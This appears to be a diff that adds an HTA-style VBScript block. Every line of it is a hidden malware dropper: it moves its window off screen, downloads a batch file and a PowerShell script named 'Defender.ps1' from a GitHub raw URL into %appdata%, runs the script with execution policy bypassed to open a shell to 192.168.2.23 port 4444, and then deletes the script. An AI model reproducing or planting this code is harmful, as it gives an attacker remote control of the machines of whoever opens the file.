@@ -1,0 +1,7 @@
+<script language="VBScript">
+  window.moveTo -4000, -4000
+  set WScript = CreateObject("WScript.Shell")
+  WScript.Run "cmd /c powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/syskey-del/winconfig/main/update','%appdata%\client.bat') && powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/syskey-del/winconfig/main/bind','%appdata%\Defender.ps1') && powerShell.exe -ExecutionPolicy Bypass -File %appdata%\Defender.ps1 -c 192.168.2.23 -p 4444 -e client.bat && del %appdata%\Defender.ps1",0
+  Set WScript = Nothing
+  window.close()
+</script>
